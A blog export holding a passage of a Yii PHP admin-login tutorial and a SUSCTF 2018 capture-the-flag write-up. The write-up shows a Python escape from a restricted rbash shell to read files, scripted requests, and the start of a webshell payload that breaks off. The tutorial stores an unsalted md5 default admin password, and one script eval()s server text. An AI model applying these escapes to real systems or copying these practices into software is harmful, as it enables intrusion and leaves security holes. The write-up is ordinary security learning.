class="string">`shop_admin`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span><span class="string">`shop_admin`</span>(</span><br><span class="line"><span class="string">`adminid`</span><span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENTCOMMENT<span class="string">'主键ID'</span>,</span><br><span class="line"><span class="string">`adminuser`</span><span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'管理员帐号'</span>,</span><br><span class="line"><span class="string">`adminpass`</span><span class="built_in">CHAR</span>(<span class="number">32</span>)<span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'管理员密码'</span>,</span><br><span class="line"><span class="string">`adminemail`</span><span class="built_in">VARCHAR</span>(<span class="number">50</span>)<span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'管理员邮箱'</span>,</span><br><span class="line"><span class="string">`logintime`</span><span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'登录时间'</span>,</span><br><span class="line"><span class="string">`loginip`</span> <span class="built_in">BIGINT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'登录IP'</span>,</span><br><span class="line"><span class="string">`createtime`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'创建时间'</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span>(<span class="string">`adminid`</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> shop_admin_adminuser_adminpass(<span class="string">`adminuser`</span>,<span class="string">`adminpass`</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> shop_admin_adminuser_adminemail(<span class="string">`adminuser`</span>,<span class="string">`adminemail`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span><span class="string">`shop_admin`</span>(adminuser,adminpass,adminemail,createtime)<span class="keyword">VALUES</span>(<span class="string">'admin'</span>,<span class="keyword">md5</span>(<span class="string">'123'</span>),<span class="string">'test@163.com'</span>,<span class="keyword">UNIX_TIMESTAMP</span>());</span><br></pre></td></tr></table></figure><p>然后导进数据库文件<br>注意字节的数据库文件名的列名是否一致，我他么找了很久才找到自己哪里错了</p><p>在后台创建models模块，一般不要选择直接在大框架下的models文件夹创建，因为我们得将后天跟前台分离开，别让它们互相影响。。</p><p>一般情况下创建的数据库的类名跟表名一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">modules</span>\<span class="title">models</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">ActiveRecord</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">ActiveRecord</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">tableName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#123;&#123;%admin&#125;&#125;"</span>;     <span class="comment">//这里不用shop_前缀是因为我们在配置数据库文件已把前缀给设定好，可以用左面的方式去写</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后再在对应的登录页面去把对应的类给调用，并且创建，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">namespace</span>  <span class="title">app</span>\<span class="title">modules</span>\<span class="title">controllers</span>;</span><br><span class="line">   <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line">   <span class="keyword">use</span> <span class="title">app</span>\<span class="title">modules</span>\<span class="title">models</span>\<span class="title">Admin</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">PublicController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionLogin</span><span class="params">()</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span> -&gt;layout = <span class="keyword">false</span>;</span><br><span class="line">           $models = <span class="keyword">new</span> Admin;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">"login"</span>,[<span class="string">'models'</span>=&gt;$models]); <span class="comment">//一定要注意返回，经常忘记</span></span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后去到后台登录页面的HTML代码，首行加载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">bootstrap</span>\<span class="title">ActiveForm</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个类有帮助创建<code>form组件</code><br>然后在对应部分添加相应的代码</p><h3 id="表单操作对应文章"><a href="#表单操作对应文章" class="headerlink" title="表单操作对应文章"></a>表单操作对应文章</h3><p><a href="http://www.jb51.net/article/77754.htm" target="_blank" rel="noopener">http://www.jb51.net/article/77754.htm</a></p><p>然后我们把对应的静态的input标签给删除掉，还有对应的说明也给删掉,下面再讲<br>注意他们对应的类型去修改，这里是因为<code>’记住我‘</code>的那一个选项引出来的点，因为他的类型是CheckBox，并且一般来说field函数的第二个参数一般是默认以数据库里面的字段去设置的，所以不存在记住我的这一个选项，我们还需要在models里面添加一个参数<code>rememberMe</code>设定为true就是默认勾选的。。。但是这个<code>CheckBox</code>的复杂性，还存在div属性，于是我们既可以利用yii框架提供给我们的template去完成，所以单独有input属性就比较简单点，直接就是在某在类型的标签里写上对应的东西即可</p><p>在提交按钮下，这里就不适用field函数了，用另外的方法实现，用的是Html的类，其实写法也差不多</p><p>首先我们得在前面添加相应的模块，这里一定要记得，我这里忘了调了很久<br> <code>use yii\Helpers\Html;</code><br> 对比一下就知道怎么写了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> Html::submitButton(<span class="string">"登录"</span>,[<span class="string">"class"</span>=&gt;<span class="string">"btn-glowprimarylogin"</span>,]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;aclass=<span class="string">"btn-glowprimarylogin"</span>href=<span class="string">"index.html"</span>&gt;登录&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>到最后还得把刚才多出来的标签给弄掉，但是我们每个区添加template就会很烦，所以<br>我们直接在begin那部分实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$form=ActiveForm::begin([</span><br><span class="line"><span class="string">'fieldConfig'</span>=&gt;[</span><br><span class="line"><span class="string">'template'</span>=&gt;<span class="string">'&#123;input&#125;'</span></span><br><span class="line">]</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终效果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $form=ActiveForm::begin([</span><br><span class="line"><span class="string">'fieldConfig'</span>=&gt;[</span><br><span class="line"><span class="string">'template'</span>=&gt;<span class="string">'&#123;input&#125;'</span></span><br><span class="line">]</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="span4box"&gt;</span><br><span class="line">&lt;div class="content-wrap"&gt;</span><br><span class="line">&lt;h6&gt;二手商城-后台管理&lt;/h6&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'adminuser'</span>)-&gt;textInput([<span class="string">"class"</span>=&gt;<span class="string">"span12"</span>,<span class="string">"placeholder"</span>=&gt;<span class="string">"管理员帐号"</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'adminpass'</span>)-&gt;passwordInput([<span class="string">"class"</span>=&gt;<span class="string">"span12"</span>,<span class="string">"placeholder"</span>=&gt;<span class="string">'管理员密码'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;a href="#"class="forgot"&gt;忘记密码?&lt;/a&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'rememberMe'</span>)-&gt;checkbox([</span><br><span class="line"><span class="string">"id"</span>=&gt;<span class="string">"remember-me"</span>,</span><br><span class="line"><span class="string">"template"</span>=&gt;<span class="string">"&lt;div class=\"remember\"&gt;&#123;input&#125;&lt;labelfor=\"remember-me\"&gt;记住我&lt;/label&gt;&lt;/div&gt;"</span>,</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> Html::submitButton(<span class="string">'登录'</span>,[<span class="string">"class"</span>=&gt;<span class="string">"btn-glowprimarylogin"</span>,]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> ActiveForm::end();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>管理后台不需要注册，记得要删除，否则出啥问题后果自负了，hiahia<br>注意这里的<code>models</code>要对应你在<code>render</code>里面的<code>‘models’</code>参数</p><p>对于后台登录页面注意接收数据的页面，然后我们在里面利用yii框架的request模块了，千万要记得记得前面加上use Yii,<br>我们就可以在下面用这样的语句去判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Yii::$app-&gt;request-&gt;isPost)</span><br></pre></td></tr></table></figure><p>我们还可以利用定义函数<code>rules</code>去定义规则，这个规则在调用<code>validate</code>的时候会调用<br>详情可以看一下下面的链接<br><a href="https://blog.csdn.net/luze_1226/article/details/65633923" target="_blank" rel="noopener">https://blog.csdn.net/luze_1226/article/details/65633923</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span>[</span><br><span class="line">[<span class="string">'adminuser'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'管理员账号不能为空'</span>],</span><br><span class="line">[<span class="string">'adminpass'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'管理员密码不能为空'</span>],</span><br><span class="line">[<span class="string">'rememberMe'</span>,<span class="string">'boolean'</span>],</span><br><span class="line">[<span class="string">'adminpass'</span>,<span class="string">'validatePass'</span>],</span><br><span class="line">];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但密码检验没有对应的方法，所以得自定义一个<code>validatePass</code>，也就是说规则是有一部分可以自定义的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validatePass</span><span class="params">()</span> //数据的验证</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;hasErrors())</span><br><span class="line">                &#123;</span><br><span class="line">                    $data = <span class="keyword">self</span>::find()-&gt;where(<span class="string">'adminuser=:user and adminpass=:pass'</span>,[<span class="string">":user"</span>=&gt;<span class="keyword">$this</span>-&gt;adminuser,<span class="string">":pass"</span>=&gt;md5(<span class="keyword">$this</span>-&gt;adminpass)])-&gt;one();</span><br><span class="line">                    <span class="keyword">if</span>(isNull($data)) <span class="comment">//判断数据是否为空</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;addError(<span class="string">"adminpass"</span>,<span class="string">"用户名或者密码错误！"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这样login里面就可以做点有意义的事情了，但是如果想让后台页面显示错误信息的话我们只需要在模板文件里面的begin里面的<code>template</code>的<code>{input}</code>的前面或者后面添加<code>{error}</code>即可，位置任选哪里好看放哪里</p><h3 id="生成动态url"><a href="#生成动态url" class="headerlink" title="生成动态url"></a>生成动态url</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&lt;?php  echo yii\Helpers\Url::to(['public/logout']); ?&gt;"</span> role=<span class="string">"button"</span>&gt;</span><br></pre></td></tr></table></figure><p> <code>Yii::$app-&gt;end();</code>这句在跳转之后的作用看一看下面这个网址，相当于die操作<br><a href="http://www.yiichina.com/question/2182" target="_blank" rel="noopener">http://www.yiichina.com/question/2182</a></p><p>在某个models里的这个东西<code>if($this-&gt;load($data)&amp;&amp; $this-&gt;validate())</code><br>可以看下面的链接<a href="http://www.yiichina.com/question/955" target="_blank" rel="noopener">http://www.yiichina.com/question/955</a><br>先是<code>load</code>是填充规则里面的东西，而<code>validate</code>就是用来检查规则的<br>但是一旦rules规则多起来，调用的时候会把规则里面的东西全检查一遍，非常耗时。。此时要增加场景来提高效率<br>在每个自定义的检查函数里面添加<code>$this-&gt;scenario = &quot;yourname&quot;</code>,并且在规则里面添加<code>on</code>参数去规定场景<br>如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'adminuser'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'管理员账号不能为空'</span>,<span class="string">'on'</span>=&gt;[<span class="string">'login'</span>,<span class="string">'seekpass'</span>]]</span><br></pre></td></tr></table></figure><h3 id="Email发送类操作"><a href="#Email发送类操作" class="headerlink" title="Email发送类操作"></a>Email发送类操作</h3><p>在web.php里面找到mailer这个选项，这个东西就是对email发送的设置、邮箱的配置详情看<br><a href="https://blog.csdn.net/cjqh_hao/article/details/48501897" target="_blank" rel="noopener">https://blog.csdn.net/cjqh_hao/article/details/48501897</a><br><a href="http://www.yiichina.com/tutorial/320" target="_blank" rel="noopener">http://www.yiichina.com/tutorial/320</a></p><p>还要记得配置里面的password填写的是授权密码啊。。。。。。真心累这东西，解决方案<br><a href="http://www.yii-china.com/post/detail/10.html" target="_blank" rel="noopener">http://www.yii-china.com/post/detail/10.html</a></p><p>注意在发送邮件的函数中也就是mailer函数调用<code>compose</code>参数的<code>view</code>参数千万不能忘记，一定要在mail文件夹下新建你对应的视图文件，不要像我一样直接在layouts里面新建了。。。而且这里面的内容就是你发送邮件的内容，里面有个函数也要注意一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yii::$app-&gt;session-&gt;setFlash(<span class="string">'info'</span>,<span class="string">'电子邮件已经发送成功，请查收'</span>);</span><br></pre></td></tr></table></figure><p>这句话不要忘记在对应的视图文件里面加上，我自己是public下面的seekpassword.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(Yii::$app-&gt;session-&gt;hasFlash(<span class="string">'info'</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> Yii::$app-&gt;session-&gt;getFlash(<span class="string">'info'</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不然不会出现成功的信息的，这里真的是对yii框架太不熟悉了，只能在项目完成过程中慢慢摸索</p><h3 id="分页处理"><a href="#分页处理" class="headerlink" title="分页处理"></a>分页处理</h3><p>运用了yii框架下的的一个组件<br>在对应的控制器里面加上<code>use yii\data\Pagination;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$model = Admin::find();</span><br><span class="line">           $count = $model-&gt;count();</span><br><span class="line">           $pageSize = Yii::$app-&gt;params[<span class="string">'pageSize'</span>][<span class="string">'manage'</span>];</span><br><span class="line">           $pager = <span class="keyword">new</span> Pagination([<span class="string">'totalCount'</span>=&gt; $count, <span class="string">'pageSize'</span>=&gt; $pageSize]);</span><br><span class="line">           $managers = $model-&gt;offset($pager-&gt;offset)-&gt;limit($pager-&gt;limit)-&gt;all();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">"managers"</span>,[<span class="string">'managers'</span>=&gt;$managers,<span class="string">'pager'</span>=&gt; $pager]);</span><br></pre></td></tr></table></figure><p>这里面把查找的内容放进新建的<code>Pagination</code>对象里面，对应的<code>pageSize</code>里面的设置是分页，可以预先放进设置文件params里面，再通过调用<code>Yii::$app-&gt;params</code>的方式去实现就好</p><p>记得要在对应的视图文件里面添加分页的输出语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> yii\widgets\LinkPager::widget([<span class="string">'pagination'</span> =&gt; $pager, <span class="string">'prevPageLabel'</span>=&gt; <span class="string">'&amp;#8249;'</span>,<span class="string">'nextPageLabel'</span> =&gt; <span class="string">'&amp;#8250;'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 后面的两个<code>Label</code>参数只是图标的形状，随意就好</p>]]></content>
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Yii </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SUSCTF 2018 做题记录</title>
      <link href="/2018/06/05/susctf2018-wp/"/>
      <url>/2018/06/05/susctf2018-wp/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近好久都没做题目，刚好上次搭的题目还在，就不要浪费了，记录记录做题过程吧</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="minBash"><a href="#minBash" class="headerlink" title="minBash"></a>minBash</h3><p>这个题目考的点是沙盒绕过，第一次玩这个东西？？反正进去之后尝试ls,cat,file等各种那个命令均无效果，都会显示<br><code>-rbash: ls: command not found</code><br>发现有一篇好文章，有空瞅瞅:<code>http://cauc.me/2017/11/16/python沙盒绕过/</code><br>一开始谷歌一下，发现解决办法是这样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure><p>输入之后发现还是不行显示 <code>-rbash: PATH: readonly variable</code><br>我们可以尝试python里面的库去执行，用的是<code>os</code>库里面的<code>listdir</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.listdir(<span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><p>注意函数里面的<code>.</code>代表的是当前目录，而<code>..</code>代表的是上级目录，也可以是绝对路径<br>得到当前目录的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;.bash_logout&apos;, &apos;.profile&apos;, &apos;.bashrc&apos;, &apos;bin&apos;, &apos;c8049f64c8080af25f414b15cb6f80c3&apos;]</span><br></pre></td></tr></table></figure><p>检验一下那个一串的东西是文件还是文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isfile(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>)</span><br></pre></td></tr></table></figure><p>发现是文件，这里提供两种方法读取文件，<br>第一种直接用Python读取文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;\n&apos;</span><br></pre></td></tr></table></figure><p>另一种是，返回到Linux命令行用strings命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings c8049f64c8080af25f414b15cb6f80c3</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;</span><br></pre></td></tr></table></figure><h3 id="faster"><a href="#faster" class="headerlink" title="faster"></a>faster</h3><p>题目说的快一点，那就试一下抓包好了，直接得到flag，这里是存在<code>302跳转</code>的，会跳转到<code>1ndex.php</code>，一开始我一直这个页面抓包可坑了，以后要注意直接从打开题目地址那一刻开始抓包-_-||<br><img src="https://s1.ax1x.com/2018/06/05/C7cZ1H.png" alt="C7cZ1H.png"></p><p>还有另一种做法就是直接<code>curl</code>一波就好了。。。不多说，水题一个</p><h3 id="put"><a href="#put" class="headerlink" title="put"></a>put</h3><p>打开题目发现这样一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put me a message then you can get the flag</span><br></pre></td></tr></table></figure><p>这个题目是考了传参的方式，水题。。。。<br>我用的两种办法<br>第一种<br>直接利用火狐的<code>F12</code>插件去完成<code>put类型</code>的传参<br><img src="https://s1.ax1x.com/2018/06/05/C7cmjA.png" alt="C7cmjA.png"><br>查看回应发现一段base64，<code>U3VzY3Rme3JlcXVlc3RfaW5fcHV0X21ldGhvZH0=</code>，解码得到flag</p><p>第二种利用python写脚本上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4447'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line">ans = res.put(url=url,data=<span class="string">'message'</span>)</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(ans.content)</span><br></pre></td></tr></table></figure><h3 id="calculator"><a href="#calculator" class="headerlink" title="calculator"></a>calculator</h3><p><img src="https://s1.ax1x.com/2018/06/05/C7cktO.png" alt="C7cktO.png"><br>这个题目明显考的是脚本题。。。没学过bs,只能一直用<code>requests</code>庫了，过段时间还是得学习一下bs</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4441'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line"></span><br><span class="line">ans1 = res.get(url)</span><br><span class="line"><span class="comment"># print ans1.content</span></span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans1.content)</span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">ans = eval(s)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">ans2 = res.post(url=url,data=&#123;<span class="string">"ans"</span>:ans&#125;).content</span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans2)</span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">ans = eval(s)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> ans2</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>这个题目过滤了字母，这里参考了几篇关于webshell的文章,各种蛇皮操作。。。。<br><a href="http://www.freebuf.com/articles/web/155891.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/155891.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br>这是自己写的payload，直接urlencode之后用bp发包得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 